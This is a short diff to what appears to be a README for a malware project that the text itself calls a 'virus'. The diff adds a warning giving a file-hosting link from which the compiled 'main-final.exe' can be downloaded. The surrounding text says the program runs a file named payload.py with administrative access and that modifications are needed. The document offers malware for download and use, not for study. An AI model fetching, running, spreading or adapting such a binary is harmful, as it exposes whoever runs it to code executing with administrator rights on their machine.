@@ -1,6 +1,8 @@
 This is a bit of a complicated malware so some modifications need to be made.
 ========================================================================
 
+Warning: The .exe is not here due to being over the file limit, you can get is from (here.)[https://www.mediafire.com/file/qn0zwh623xosk3u/main-final.exe/file]
+
 The modifications are:
 
 1. This virus does not target a system, instead it focuses on running a file called payload.py with administrative access.
